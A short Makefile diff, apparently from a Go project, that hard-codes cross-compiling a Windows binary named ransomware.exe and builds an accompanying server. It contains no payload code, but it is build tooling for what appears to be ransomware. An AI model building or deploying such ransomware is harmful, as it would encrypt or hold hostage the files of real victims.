@@ -1,11 +1,5 @@
 .PHONY: all
 
-ifeq ($(GOOS),"windows")
-    BUILD := go build
-else
-    BUILD := env GOOS=windows go build
-endif
-
 all: build clean
 
 pre-build:
@@ -13,7 +7,7 @@ pre-build:
 	mkdir -p build
 
 build: pre-build
-	$(BUILD) && mv ransomware.exe build
+	env GOOS=windows go build && mv ransomware.exe build
 	cd server && go build && mv `ls|grep server` ../build
 
 clean:
